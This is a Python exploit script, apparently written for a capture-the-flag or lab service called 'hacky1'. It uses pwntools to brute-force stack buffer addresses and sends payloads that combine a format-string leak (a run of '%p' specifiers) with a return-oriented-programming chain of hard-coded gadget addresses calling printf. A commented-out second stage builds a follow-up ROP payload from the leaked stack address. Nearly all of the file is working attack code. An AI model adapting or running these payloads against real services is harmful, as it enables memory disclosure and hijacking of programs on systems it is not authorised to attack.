#!/usr/bin/python3

import sys
import socket
import time


#NOTE: relevant non-boilerplate code starts at line 77

#assign host and port to connect to
if len(sys.argv) >= 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
else:
    host = "hacky1"
    port = 13704

s = socket.socket()
#s.connect((host, port))


#functions to communicate with server (based on funtions from qual.py)
def dbg_print(txt):
    debug = True
    if debug:
        print(txt.decode('utf-8'))

def recv_until_timed(delim, timeout):
    global s
    if type(delim) is not bytes:
        delim = delim.encode('utf-8')
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while delim not in tmp and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_until(delim):
    return recv_until_timed(delim, 0)

def recv_cnt_timed(count, timeout):
    global s
    tmp = b''
    starttime = time.time()
    if timeout <= 0:
        timeout = float('inf')
    while len(tmp) < count and (time.time() - starttime) <= timeout:
            try:
                    r = s.recv(1)
                    if not r:
                            dbg_print(tmp)
                            return tmp
                    tmp += r
            except InterruptedError:
                    pass
    dbg_print(tmp)
    return tmp

def recv_cnt(count):
    return recv_cnt_timed(count, 0)

def send(b):
    if type(b) is not bytes:
        b = b.encode('utf-8')
    s.send(b)


from pwn import *

for i in range(0,819):
    print("Versuch ")
    print(hex(i))
    print("\n")
    proc = remote(host, port)

    buf_addr_low = (i*0x50).to_bytes(2, 'little')
    buf_addr_high = b"\xff\xff\xff\x7f\x00\x00" 

    print("Addr: ")
    print(buf_addr_low + buf_addr_high)
    print("\n")

    printf_gadget = b"\x6d\x11\x40\x00\x00\x00\x00\x00" 

    pop_rdi_gadget = b"\x3b\x12\x40\x00\x00\x00\x00\x00" 
    pop_rsi_pop_r15_gadget = b"\x39\x12\x40\x00\x00\x00\x00\x00"

    exploit_str_1 =  b"\x00" 
    exploit_str_1 += 43*b"%p" 
    exploit_str_1 += b"\x00" 
    exploit_str_1 += pop_rdi_gadget
    exploit_str_1 += buf_addr_low
    exploit_str_1 += buf_addr_high
    exploit_str_1 += printf_gadget
    exploit_str_1 += b"\n"

    print(proc.read(timeout=3))
    proc.write(exploit_str_1)
    retmem_1 = proc.read(timeout=3)
    print(retmem_1)
    print("\n")

#stack_addr_1 =  int(retmem_1[17:29], 16).to_bytes(8, 'little')
#print(stack_addr_1)
#
#buf_addr_2 = (int.from_bytes(buf_addr, byteorder='little')+70).to_bytes(8, 'little')
#
#exploit_str_2 =  b"\x00"
#exploit_str_2 += 43*b"%p" 
#exploit_str_2 += b"\x00" 
#exploit_str_2 += pop_rdi_gadget
#exploit_str_2 += buf_addr_2
#exploit_str_2 += pop_rsi_pop_r15_gadget
#exploit_str_2 += stack_addr_1
#exploit_str_2 += 8*b"\x00"
#exploit_str_2 += printf_gadget
#exploit_str_2 += b"\n"
#
#proc.write(exploit_str_2)
#print(proc.read())



